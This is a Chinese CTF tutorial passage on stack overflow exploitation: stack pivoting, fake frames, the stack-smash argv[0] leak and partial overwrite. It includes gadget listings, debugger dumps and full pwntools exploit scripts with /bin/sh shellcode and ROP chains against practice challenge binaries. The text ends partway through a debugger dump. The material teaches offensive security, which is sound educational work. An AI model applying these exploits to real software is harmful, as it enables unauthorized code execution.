#  花式栈溢出技巧

## stack pivoting

### 原理

stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting

- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用

此外，利用 stack pivoting 有以下几个要求

- 可以控制程序执行流。

- 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是

```asm
pop rsp/esp
```

当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。

```asm
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:	pop    rbx
0x40061b <__libc_csu_init+91>:	pop    rbp
0x40061c <__libc_csu_init+92>:	pop    r12
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:	pop    rsp
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret
```

  此外，还有更加高级的 fake frame。


- 存在可以控制内容的内存，一般有如下
  - bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
  - heap。但是这个需要我们能够泄露堆地址。

### 示例

#### 例1

这里我们以 [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) 为例进行介绍。首先，查看程序的安全保护，如下

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

可以看出源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞

```C
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下

- 利用栈溢出布置 shellcode
- 控制 eip 指向 shellcode 处

第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下

```text
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

所以我们最后一段需要执行的指令就是

```asm
sub esp,0x28
jmp esp
```

所以最后的 exp 如下

```python
from pwn import *
sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

#### 例2-转移堆

待。

### 题目

- [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)

## frame faking

正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。

### 原理

概括地讲，我们在之前讲的栈溢出不外乎两种方式

- 控制程序 EIP
- 控制程序 EBP

其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下

```
buffer padding|fake ebp|leave ret addr|
```

即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分

- 函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。
- 其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```

这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。

**下面的汇编语法是 intel 语法。**

在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作

入口点

```
push ebp  # 将ebp压栈
mov ebp, esp #将esp的值赋给ebp
```

出口点

```
leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址
```

其中 leave 指令相当于

```
mov esp, ebp # 将ebp的值赋给esp
pop ebp # 弹出ebp
```

下面我们来仔细说一下基本的控制过程。

1. 在有栈溢出的程序执行 leave 时，其分为两个步骤

    - mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
    - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。

2. 执行 ret 指令，会再次执行 leave ret 指令。

3. 执行 leave 指令，其分为两个步骤

    - mov esp, ebp ，这会将 esp 指向 ebp2。
    - pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。

4. 执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行

    - push ebp，会将 ebp2 值压入栈中，

    - mov ebp, esp，将 ebp 指向当前基地址。

此时的栈结构如下

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
```

5. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。

6. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。

可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。


### 2018 安恒杯 over
以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over) 中找到

#### 文件信息
```bash
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 
NX 保护  

#### 分析程序
放到 IDA 中进行分析 
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}
```
漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了

#### leak stack
为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了
```C
Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

   0x4006be    leave
   0x4006bf    ret

   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
```

leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 

比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 `sub_400676` 函数来 leak libc。 
​	 
然后在下一次利用时就可以通过 rop 执行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)` 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 `execve("/bin/sh", 0, 0)` 的利用链, 这种方法更稳妥(`system("/bin/sh")` 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定

#### exp
```python
from pwn import *
context.binary = "./over.over"

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))


#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

pop_rdi_ret=0x400793
'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
'''
pop_rdx_pop_rsi_ret=libc.address+0xf5279


payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])

io.sendafter(">", payload)

io.interactive()
```

总的来说这种方法跟 stack pivot 差别并不是很大。

### 参考阅读

- [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
- [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)

## Stack smash

### 原理


在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下

```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 `__fortify_fail` 函数中就会输出我们想要的信息。

### 32C3 CTF readme

这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 jarvisoj 上有复现。

#### 确定保护

可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。

```shell
➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

#### 分析程序

ida 看一下

```c
__int64 sub_4007E0()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 v4; // [sp+0h] [bp-128h]@1
  __int64 v5; // [sp+108h] [bp-20h]@1

  v5 = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets((__int64)&v4);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == '\n' )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == ' ' )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

很显然，程序在 `_IO_gets((__int64)&v4)`; 存在栈溢出。

此外，程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句

```C
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

又看了看对应地址的内容，可以发现如下内容，说明程序的flag就在这里。


```
.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
```

但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 ` byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了

- 在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find来进行查找。

#### 确定 flag 地址

我们把断点下载 memset 函数处，然后读取相应的内容如下

```asm
gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222

Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38	../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e	 ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
```

可以看出我们读入的 2222 已经覆盖了 0x600d20 处的 flag，但是我们在内存的 0x400d20 处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了 flag 的地址。

#### 确定偏移

下面，我们确定 argv[0] 距离读取的字符串的偏移。

首先下断点在 main 函数入口处，如下

```asm
gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 

Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax	 ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 

```

可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。

此外，根据汇编代码

```asm
.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets
```

我们可以确定我们读入的字符串的起始地址其实就是调用 `__IO_gets` 之前的 rsp，所以我们把断点下在 call 处，如下

```asm
gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000	 ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
────────────────────────────────────────────[ trace ]────
[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
──────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40
```

可以看出rsp的值为0x7fffffffda40，那么相对偏移为

```python
>>> 0x00007fffffffdc58-0x7fffffffda40
536
>>> hex(536)
'0x218'
```

#### 利用程序

我们构造利用程序如下

```python
from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')
if args['REMOTE']:
    sh = remote('pwn.jarvisoj.com', 9877)
else:
    sh = process('./smashes')
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()
```

这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。

### 题目
- 2018 网鼎杯 - guess

## 栈上的 partial overwrite
partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。

我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。

### 2018-安恒杯-babypie
以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite) 中
#### 确定保护
```bash
babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
64 位动态链接的文件, 开启了 PIE 保护和栈溢出保护
#### 分析程序
IDA 中看一下, 很容易就能发现漏洞点, 两处输入都有很明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了
```C
__int64 sub_960()
{
  char buf[40]; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  *(_OWORD *)buf = 0uLL;
  *(_OWORD *)&buf[16] = 0uLL;
  puts("Input your Name:");
  read(0, buf, 0x30uLL);                        // overflow
  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
  read(0, buf, 0x60uLL);                        // overflow
  return 0LL;
}
```

同时也发现程序中给了能直接 get shell 的函数
```asm
.text:0000000000000A3E getshell        proc near
.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
.text:0000000000000A3F                 mov     rbp, rsp
.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
.text:0000000000000A49                 call    _system
.text:0000000000000A4E                 nop
.text:0000000000000A4F                 pop     rbp
.text:0000000000000A50                 retn
.text:0000000000000A50 ; } // starts at A3E
.text:0000000000000A50 getshell        endp
```
这样我们只要控制 rip 到该函数即可

#### leak canary
在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。

为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)

```asm
Breakpoint 1, 0x0000557c8443aa08 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x30
 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R10  0x37b
 R11  0x246
 R12  0x557c8443a830 ◂— xor    ebp, ebp
 R13  0x7ffd97aa0540 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x557c8443aa08    call   0x557c8443a7e0

   0x557c8443aa0d    lea    rax, [rbp - 0x30]
   0x557c8443aa11    mov    edx, 0x60
   0x557c8443aa16    mov    rsi, rax
   0x557c8443aa19    mov    edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0

   0x557c8443aa23    mov    eax, 0
   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
   0x557c8443aa35    je     0x557c8443aa3c

   0x557c8443aa37    call   0x557c8443a7c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
